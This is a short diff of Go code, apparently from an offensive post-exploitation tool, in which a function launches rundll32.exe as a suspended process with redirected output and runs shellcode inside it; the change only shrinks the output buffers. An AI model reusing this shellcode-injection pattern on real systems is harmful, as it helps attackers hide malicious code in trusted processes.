@@ -30,8 +30,8 @@ func (d *Donut) Run(command string, timeout int) ([]byte, string, string) {
 	handle, pid, stdout, stderr := CreateSuspendedProcessWithIORedirect("rundll32.exe")
 
 	//Setup variables
-	stdoutBytes := make([]byte, 4096)
-	stderrBytes := make([]byte, 4096)
+	stdoutBytes := make([]byte, 1)
+	stderrBytes := make([]byte, 1)
 	var eventCode uint32
 
 	// Run the shellcode and wait for it to complete
